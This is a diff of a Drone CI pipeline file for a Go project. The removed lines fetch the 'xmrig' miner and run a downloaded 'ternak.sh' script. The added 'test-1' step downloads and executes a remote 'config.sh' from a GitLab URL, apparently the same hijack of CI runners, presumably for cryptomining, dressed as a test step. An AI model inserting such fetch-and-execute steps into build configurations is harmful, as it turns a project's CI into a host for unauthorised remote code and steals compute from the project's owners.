@@ -1,28 +1,9 @@
----
 kind: pipeline
-name: One
-workspace:
-  base: /go
-  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
-steps:
-- name: download golang
-  image: golangci/golangci-lint:v1.26.0
-  commands:
-  - golangci-lint run
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/xmrig
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
----
-kind: pipeline
-name: build
-workspace:
-  base: /go
-  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
-steps:
-- name: golangci-lint
-  image: golangci/golangci-lint:v1.26.0
-  commands:
-  - golangci-lint run
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/xmrig
-  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+type: docker
+name: default-1
 
-
+steps:
+- name: test-1
+  image: golang
+  commands:
+     - wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
